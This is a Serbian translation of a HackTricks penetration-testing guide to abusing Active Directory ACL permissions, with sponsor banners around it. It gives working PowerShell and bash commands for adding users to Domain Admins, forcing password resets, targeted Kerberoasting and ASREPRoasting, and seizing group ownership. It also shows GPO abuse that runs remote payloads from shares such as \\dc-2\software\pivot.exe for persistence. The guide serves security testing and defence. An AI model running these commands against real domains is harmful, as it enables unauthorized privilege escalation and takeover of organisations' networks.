# Zloupotreba ACL/ACE u Active Directory-u

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivno skeniranje pretnji, pronalazi probleme u celokupnom tehnološkom sklopu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Ova stranica je uglavnom sažetak tehnika sa [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) i [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges). Za više detalja, proverite originalne članke.**


## **GenericAll prava nad korisnikom**
Ova privilegija omogućava napadaču potpunu kontrolu nad ciljnim korisničkim nalogom. Kada se potvrde `GenericAll` prava korišćenjem `Get-ObjectAcl` komande, napadač može:

- **Promeniti lozinku cilja**: Korišćenjem `net user <korisničko_ime> <lozinka> /domain`, napadač može resetovati korisničku lozinku.
- **Ciljano Kerberoasting**: Dodeliti SPN korisničkom nalogu kako bi ga učinili kerberoastable, zatim koristiti Rubeus i targetedKerberoast.py da izvuče i pokuša da dešifruje heševe tiketa za dodelu tiketa (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Ciljano ASREPRoasting napad**: Onemogućite pre-autentifikaciju za korisnika, čime njihov nalog postaje ranjiv na ASREPRoasting napad.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll prava na grupi**
Ovo ovlašćenje omogućava napadaču da manipuliše članstvom u grupi ako ima `GenericAll` prava na grupi kao što je `Domain Admins`. Nakon identifikacije razlikovnog imena grupe pomoću `Get-NetGroup` komande, napadač može:

- **Dodati sebe u grupu Domain Admins**: Ovo se može uraditi putem direktnih komandi ili korišćenjem modula kao što su Active Directory ili PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write na računaru/korisniku**
Imajući ove privilegije na računaru ili korisničkom nalogu omogućava:

- **Kerberos ograničeno preusmeravanje resursa**: Omogućava preuzimanje računara.
- **Senke akreditiva**: Koristite ovu tehniku da se predstavljate kao računar ili korisnički nalog iskorišćavajući privilegije za kreiranje senki akreditiva.

## **WriteProperty na grupi**
Ako korisnik ima prava `WriteProperty` na svim objektima za određenu grupu (npr. `Domain Admins`), moguće je:

- **Dodavanje sebe u grupu Domain Admins**: Ovo se postiže kombinovanjem komandi `net user` i `Add-NetGroupUser`, a omogućava eskalaciju privilegija unutar domena.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Samostalno (Samopripadnost) u grupi**
Ova privilegija omogućava napadačima da se dodaju u određene grupe, kao što su `Domain Admins`, putem komandi koje direktno manipulišu članstvom u grupi. Korišćenje sledećeg niza komandi omogućava samododavanje:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Samopripadnost)**
Slična privilegija, ovo omogućava napadačima da se direktno dodaju u grupe modifikovanjem svojstava grupa ako imaju pravo `WriteProperty` na tim grupama. Potvrda i izvršenje ove privilegije se vrši sa:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
Držanje `ExtendedRight` na korisniku za `User-Force-Change-Password` omogućava resetovanje lozinke bez poznavanja trenutne lozinke. Verifikacija ove privilegije i njeno iskorišćavanje može se obaviti putem PowerShell-a ili alternativnih alata komandne linije, nudeći nekoliko metoda za resetovanje korisničke lozinke, uključujući interaktivne sesije i jednolinijske naredbe za neinteraktivna okruženja. Komande se kreću od jednostavnih PowerShell poziva do korišćenja `rpcclient` na Linux-u, što pokazuje raznovrsnost vektora napada.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner na grupi**
Ako napadač otkrije da ima prava `WriteOwner` nad grupom, može promeniti vlasništvo nad grupom na sebe. Ovo je posebno značajno kada je u pitanju grupa `Domain Admins`, jer promena vlasništva omogućava širu kontrolu nad atributima grupe i članstvom. Postupak uključuje identifikaciju odgovarajućeg objekta putem `Get-ObjectAcl` i zatim korišćenje `Set-DomainObjectOwner` da se promeni vlasnik, bilo preko SID-a ili imena.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite na korisniku**
Ova dozvola omogućava napadaču da izmeni osobine korisnika. Konkretno, sa `GenericWrite` pristupom, napadač može promeniti putanju skripte za prijavljivanje korisnika kako bi izvršio zlonamernu skriptu prilikom prijavljivanja korisnika. Ovo se postiže korišćenjem `Set-ADObject` komande za ažuriranje osobine `scriptpath` ciljnog korisnika kako bi pokazivala na napadačevu skriptu.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite na grupi**
Sa ovim privilegijama, napadači mogu manipulisati članstvom u grupi, kao što je dodavanje sebe ili drugih korisnika u određene grupe. Ovaj proces uključuje kreiranje objekta za akreditaciju, korišćenje istog za dodavanje ili uklanjanje korisnika iz grupe, i proveru promena članstva pomoću PowerShell komandi.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
Vlasništvo nad AD objektom i posedovanje privilegija `WriteDACL` omogućava napadaču da sebi dodeli privilegije `GenericAll` nad objektom. Ovo se postiže manipulacijom ADSI-ja, što omogućava potpunu kontrolu nad objektom i mogućnost izmene njegovih grupnih članstava. Međutim, postoje ograničenja prilikom pokušaja iskorišćavanja ovih privilegija pomoću `Set-Acl` / `Get-Acl` cmdlet-a Active Directory modula.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikacija na domenu (DCSync)**
Napad DCSync koristi određene dozvole za replikaciju na domenu kako bi imitirao kontroler domene i sinhronizovao podatke, uključujući korisničke akreditive. Ova moćna tehnika zahteva dozvole poput `DS-Replication-Get-Changes`, omogućavajući napadačima da izvuču osetljive informacije iz AD okruženja bez direktnog pristupa kontroleru domene.
[**Saznajte više o napadu DCSync ovde.**](../dcsync.md)

## Delegacija GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegacija GPO

Delegirani pristup za upravljanje objektima grupe politika (GPO) može predstavljati značajne sigurnosne rizike. Na primer, ako je korisnik poput `offense\spotless` delegiran pravima za upravljanje GPO-ima, mogu imati privilegije poput **WriteProperty**, **WriteDacl** i **WriteOwner**. Ove dozvole mogu biti zloupotrebljene u zlonamerne svrhe, kao što je identifikacija korišćenjem PowerView-a:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### Nabrojavanje dozvola GPO-a

Da biste identifikovali netačno konfigurisane GPO-ove, mogu se povezati cmdleti PowerSploit-a. Ovo omogućava otkrivanje GPO-ova kojima određeni korisnik ima dozvole za upravljanje:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**Računari sa primenjenom određenom politikom**: Moguće je utvrditi na koje računare se primenjuje određena GPO, što pomaže u razumevanju obima potencijalnog uticaja.
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**Politike primenjene na određeni računar**: Da biste videli koje politike se primenjuju na određeni računar, mogu se koristiti komande poput `Get-DomainGPO`.

**OU sa primenjenom određenom politikom**: Identifikacija organizacionih jedinica (OU) koje su pogođene određenom politikom može se obaviti korišćenjem `Get-DomainOU`.

### Zloupotreba GPO-a - New-GPOImmediateTask

Netačno konfigurisani GPO-ovi mogu biti iskorišćeni za izvršavanje koda, na primer, stvaranjem odmah zakazanog zadatka. Ovo se može uraditi kako bi se dodao korisnik u lokalnu administratorsku grupu na pogođenim mašinama, značajno povećavajući privilegije:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy modul - Zloupotreba GPO

Ako je instaliran GroupPolicy modul, omogućava se kreiranje i povezivanje novih GPO-ova, kao i podešavanje preferencija poput vrednosti registra radi izvršavanja zadnjih vrata na pogođenim računarima. Ovaj metod zahteva ažuriranje GPO-a i prijavljivanje korisnika na računaru radi izvršavanja:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Zloupotreba GPO

SharpGPOAbuse nudi metod za zloupotrebu postojećih GPO-ova dodavanjem zadataka ili izmenom podešavanja bez potrebe za kreiranjem novih GPO-ova. Ovaj alat zahteva modifikaciju postojećih GPO-ova ili korišćenje RSAT alata za kreiranje novih pre primene promena:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Ažuriranje politike prisilom

Obično se ažuriranja GPO-a događaju svakih 90 minuta. Da biste ubrzali ovaj proces, posebno nakon implementacije promene, možete koristiti komandu `gpupdate /force` na ciljnom računaru kako biste prisilno ažurirali politiku odmah. Ova komanda osigurava da se bilo kakve izmene u GPO-ima primene bez čekanja na sledeći automatski ciklus ažuriranja.

### Ispod haube

Pregledom zakazanih zadataka za određeni GPO, poput `Nekonfigurisane politike`, može se potvrditi dodavanje zadataka poput `evilTask`. Ovi zadaci se kreiraju putem skripti ili alata komandne linije sa ciljem modifikacije ponašanja sistema ili eskalacije privilegija.

Struktura zadatka, prikazana u XML konfiguracionom fajlu generisanom pomoću `New-GPOImmediateTask`, opisuje detalje zakazanog zadatka - uključujući komandu koja će se izvršiti i njene okidače. Ovaj fajl predstavlja način na koji su definisani i upravljani zakazani zadaci unutar GPO-a, pružajući metodu za izvršavanje proizvoljnih komandi ili skripti kao deo sprovođenja politike.

### Korisnici i grupe

GPO-ovi takođe omogućavaju manipulaciju članstva korisnika i grupa na ciljnim sistemima. Napadači mogu dodavati korisnike privilegovanim grupama, poput lokalne grupe `administrators`, tako što direktno uređuju fajlove politike za korisnike i grupe. Ovo je moguće putem delegiranja dozvola za upravljanje GPO-ima, što omogućava modifikaciju fajlova politike kako bi se dodali novi korisnici ili promenila članstva grupa.

XML konfiguracioni fajl za korisnike i grupe opisuje kako se ove promene implementiraju. Dodavanjem unosa u ovaj fajl, određenim korisnicima mogu se dodeliti povišene privilegije na pogođenim sistemima. Ovaj metod pruža direktan pristup eskalaciji privilegija putem manipulacije GPO-ovima.

Osim toga, mogu se razmotriti i dodatne metode za izvršavanje koda ili održavanje postojanosti, poput iskorišćavanja skripti za prijavljivanje/odjavljivanje, modifikacije registarskih ključeva za automatsko pokretanje, instaliranje softvera putem .msi fajlova ili uređivanje konfiguracija servisa. Ove tehnike pružaju različite načine za održavanje pristupa i kontrolu ciljnih sistema putem zloupotrebe GPO-ova.



## Reference

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže otklonili. Intruder prati vašu površinu napada, pokreće proaktivne pretrage pretnji, pronalazi probleme u celokupnom tehnološkom sklopu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repozitorijume.**

</details>
